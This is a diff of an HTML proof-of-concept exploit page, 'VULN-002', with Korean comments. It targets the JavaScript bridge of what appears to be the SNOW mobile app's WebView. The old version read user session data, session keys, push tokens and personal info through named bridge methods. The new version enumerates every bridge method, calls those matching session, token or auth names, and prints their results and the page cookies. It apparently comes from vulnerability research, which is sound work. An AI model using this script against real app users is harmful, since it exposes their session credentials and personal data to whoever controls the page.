@@ -5,71 +5,87 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-body{background:#111;color:#eee;font-family:monospace;font-size:13px;padding:14px;word-break:break-all}
-.t{color:#f85149;font-weight:bold;font-size:15px;display:block;margin-bottom:12px}
-.s{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:10px;margin-bottom:10px}
-.k{color:#e3b341;min-width:130px;display:inline-block}
+body{background:#111;color:#eee;font-family:monospace;font-size:12px;padding:12px;word-break:break-all}
+.t{color:#f85149;font-weight:bold;font-size:14px;display:block;margin-bottom:10px}
+.s{background:#161b22;border:1px solid #30363d;border-radius:5px;padding:8px 10px;margin-bottom:8px}
+.k{color:#e3b341;min-width:110px;display:inline-block;vertical-align:top}
 .v{color:#79c0ff}
 .hi{color:#f85149;font-weight:bold}
 .ok{color:#3fb950;font-weight:bold}
-.sub{color:#8b949e;font-size:11px;display:block;margin-top:4px}
 </style>
 </head>
 <body>
-<span class="t">⚠ VULN-002 PoC: JS Bridge 개인정보 노출</span>
+<span class="t">⚠ VULN-002 PoC — Bridge Method Enumeration</span>
 <div id="o"></div>
 <script>
 var o = document.getElementById('o');
-function row(k, v, hi) {
-  o.innerHTML += '<div class="s"><span class="k">' + k + '</span><span class="' + (hi?'hi':'v') + '">' + v + '</span></div>';
+function row(k, v, cls) {
+  o.innerHTML += '<div class="s"><span class="k">' + k + '</span><span class="' + (cls||'v') + '">' + String(v) + '</span></div>';
 }
 
 // Bridge 탐색
-var b = null;
-['B612KajiBridgeInterface','AndroidBridge','androidBridge'].forEach(function(n){
-  try { if(!b && typeof window[n]!=='undefined') b=window[n]; } catch(e){}
+var b = null, bname = '';
+['B612KajiBridgeInterface','AndroidBridge','androidBridge','snowBridge'].forEach(function(n){
+  try { if (!b && typeof window[n] !== 'undefined') { b = window[n]; bname = n; } } catch(e){}
 });
 
 if (!b) {
-  o.innerHTML = '<div class="s"><span class="hi">Bridge NOT FOUND</span><span class="sub">SNOW WebView 컨텍스트에서 실행해야 합니다</span></div>';
+  row('RESULT', 'Bridge NOT FOUND', 'hi');
 } else {
-  row('Bridge', 'B612KajiBridgeInterface FOUND', true);
+  row('Bridge', bname + ' FOUND', 'ok');
 
-  // 1. getUserSession — 세션 정보
+  // 전체 메서드 열거
+  var methods = [];
   try {
-    var s = JSON.parse(b.getUserSession()) || {};
-    row('userId',          s.userId||'', true);
-    row('userOid',         s.userOid||'', true);
-    row('name',            s.name||'(없음)');
-    row('availableReward', s.availableReward, true);
-    row('isVIP',           String(s.isVIP));
-    row('sessionKey',      s.sessionKey ? s.sessionKey.substr(0,50)+'...' : '', true);
-    row('xColor',          s.xColor    ? s.xColor.substr(0,50)+'...'    : '', true);
-    row('pushToken',       s.pushToken ? s.pushToken.substr(0,60)+'...' : '', true);
-  } catch(e) { row('getUserSession ERR', e, false); }
-
-  // 2. getPersonalInfo — 개인정보
-  try {
-    var p = b.getPersonalInfo();
-    row('getPersonalInfo', p || '(empty)', true);
-    if (p) {
+    for (var k in b) {
       try {
-        var pj = JSON.parse(p);
-        Object.keys(pj).forEach(function(k){
-          if(pj[k]) row('  └ '+k, String(pj[k]), true);
-        });
+        if (typeof b[k] === 'function') methods.push(k);
       } catch(e) {}
     }
-  } catch(e) { row('getPersonalInfo ERR', e, false); }
+  } catch(e) {}
 
-  // 3. appInfo — 앱/기기 정보
-  try {
-    var a = b.appInfo();
-    row('appInfo', a || '(empty)');
-  } catch(e) { row('appInfo ERR', e, false); }
+  row('메서드 수', methods.length, 'ok');
+  row('메서드 목록', methods.join(' | ') || '(empty)', 'v');
 
-  // 4. Cookie
-  row('document.cookie', document.cookie || '(empty)', !!document.cookie);
+  // 세션/유저 관련 메서드 탐색
+  var sessionMethods = methods.filter(function(m){
+    var ml = m.toLowerCase();
+    return ml.indexOf('session') >= 0 || ml.indexOf('user') >= 0 ||
+           ml.indexOf('personal') >= 0 || ml.indexOf('info') >= 0 ||
+           ml.indexOf('login') >= 0 || ml.indexOf('profile') >= 0 ||
+           ml.indexOf('account') >= 0 || ml.indexOf('token') >= 0 ||
+           ml.indexOf('auth') >= 0;
+  });
+
+  if (sessionMethods.length) {
+    row('관련 메서드', sessionMethods.join(' | '), 'hi');
+
+    // 관련 메서드 각각 호출 시도 (인자 없이)
+    sessionMethods.forEach(function(m) {
+      try {
+        var r = b[m]();
+        row(m + '()', r === undefined ? '(undefined)' : String(r), 'hi');
+      } catch(e) {
+        row(m + '()', String(e), 'v');
+      }
+    });
+  }
+
+  // 인자 없이 호출 가능한 모든 메서드 시도
+  row('--- 전체 호출 시도 ---', '', 'ok');
+  methods.forEach(function(m) {
+    try {
+      var r = b[m]();
+      if (r !== undefined && r !== null && String(r).length > 0 && String(r) !== 'undefined') {
+        row(m + '()', String(r).substring(0, 200), 'hi');
+      }
+    } catch(e) {
+      // 오류는 무시 (인자 필요한 메서드)
+    }
+  });
+
+  // Cookie
+  row('cookie', document.cookie || '(empty)', document.cookie ? 'hi' : 'v');
 }
 </script>
 </body>
